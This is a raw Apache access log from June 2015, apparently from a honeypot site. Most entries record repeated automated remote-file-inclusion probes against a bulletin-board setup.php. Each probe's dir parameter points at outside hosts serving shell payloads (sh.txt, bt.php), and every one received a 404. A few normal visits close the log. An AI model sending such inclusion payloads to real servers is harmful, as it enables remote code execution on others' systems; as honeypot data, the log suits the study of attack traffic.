37.9.169.26 - - [22/Jun/2015:05:48:13 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
37.9.169.26 - - [22/Jun/2015:05:48:13 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
54.200.46.66 - - [22/Jun/2015:05:48:14 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
54.200.46.66 - - [22/Jun/2015:05:48:14 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
37.9.169.26 - - [22/Jun/2015:05:48:14 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
37.9.169.26 - - [22/Jun/2015:05:48:14 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:05:48:15 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
37.9.169.26 - - [22/Jun/2015:05:48:15 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
54.200.46.66 - - [22/Jun/2015:05:48:15 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
37.9.169.26 - - [22/Jun/2015:05:48:16 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
37.9.169.26 - - [22/Jun/2015:05:48:16 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:05:48:16 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
37.9.169.26 - - [22/Jun/2015:05:48:16 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:05:48:17 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
37.9.169.26 - - [22/Jun/2015:05:48:17 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:05:48:18 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
37.9.169.26 - - [22/Jun/2015:05:48:18 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:05:48:19 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:05:48:19 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
37.9.169.26 - - [22/Jun/2015:05:48:19 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:05:48:19 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
37.9.169.26 - - [22/Jun/2015:05:48:20 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:05:48:20 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
37.9.169.26 - - [22/Jun/2015:05:48:20 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:05:48:20 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
37.9.169.26 - - [22/Jun/2015:05:48:22 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:05:48:22 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
181.65.186.34 - - [22/Jun/2015:05:48:51 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 295 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)" 
213.165.70.246 - - [22/Jun/2015:05:49:01 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:02 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:03 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:04 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:04 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:05 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:05 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:07 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:07 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:08 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:08 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
181.65.186.34 - - [22/Jun/2015:05:49:09 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)" 
213.165.70.246 - - [22/Jun/2015:05:49:09 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
181.65.186.34 - - [22/Jun/2015:05:49:11 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)" 
181.65.186.34 - - [22/Jun/2015:05:49:19 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)" 
181.65.186.34 - - [22/Jun/2015:05:49:20 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)" 
213.165.70.246 - - [22/Jun/2015:05:49:41 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:42 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:42 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
27.50.84.253 - - [22/Jun/2015:05:49:44 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
213.165.70.246 - - [22/Jun/2015:05:49:44 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:44 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
27.50.84.253 - - [22/Jun/2015:05:49:45 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
213.165.70.246 - - [22/Jun/2015:05:49:45 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
213.165.70.246 - - [22/Jun/2015:05:49:45 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
27.50.84.253 - - [22/Jun/2015:05:49:46 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
54.200.46.66 - - [22/Jun/2015:05:49:46 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
213.165.70.246 - - [22/Jun/2015:05:49:47 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
54.200.46.66 - - [22/Jun/2015:05:49:47 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
213.165.70.246 - - [22/Jun/2015:05:49:47 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
27.50.84.253 - - [22/Jun/2015:05:49:47 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
54.200.46.66 - - [22/Jun/2015:05:49:47 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
27.50.84.253 - - [22/Jun/2015:05:49:47 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
213.165.70.246 - - [22/Jun/2015:05:49:48 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
54.200.46.66 - - [22/Jun/2015:05:49:48 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
213.165.70.246 - - [22/Jun/2015:05:49:48 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
54.200.46.66 - - [22/Jun/2015:05:49:48 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
27.50.84.253 - - [22/Jun/2015:05:49:49 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:05:49:49 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
54.200.46.66 - - [22/Jun/2015:05:49:49 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
213.165.70.246 - - [22/Jun/2015:05:49:50 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
54.200.46.66 - - [22/Jun/2015:05:49:50 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
27.50.84.253 - - [22/Jun/2015:05:49:51 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
54.200.46.66 - - [22/Jun/2015:05:49:51 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
54.200.46.66 - - [22/Jun/2015:05:49:51 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
27.50.84.253 - - [22/Jun/2015:05:49:51 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
54.200.46.66 - - [22/Jun/2015:05:49:52 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
54.200.46.66 - - [22/Jun/2015:05:49:52 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
27.50.84.253 - - [22/Jun/2015:05:49:53 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:05:49:53 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
54.200.46.66 - - [22/Jun/2015:05:49:53 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
27.50.84.253 - - [22/Jun/2015:05:49:55 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
37.9.169.26 - - [22/Jun/2015:06:08:44 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:06:08:45 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:06:08:46 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:06:08:47 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:06:08:47 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:06:08:48 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:06:08:49 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:06:08:50 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:06:08:50 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:06:08:51 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:06:08:52 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
37.9.169.26 - - [22/Jun/2015:06:08:53 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0" 
181.65.186.34 - - [22/Jun/2015:06:10:49 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko" 
181.65.186.34 - - [22/Jun/2015:06:10:50 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko" 
181.65.186.34 - - [22/Jun/2015:06:10:51 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko" 
181.65.186.34 - - [22/Jun/2015:06:10:52 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko" 
174.70.24.194 - - [22/Jun/2015:06:11:15 -0700] "GET / HTTP/1.1" 200 7043 "http://www2.mlsecproject.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
66.249.83.189 - - [22/Jun/2015:06:17:34 -0700] "GET / HTTP/1.1" 200 7043 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon" 
66.249.83.129 - - [22/Jun/2015:06:17:34 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon" 
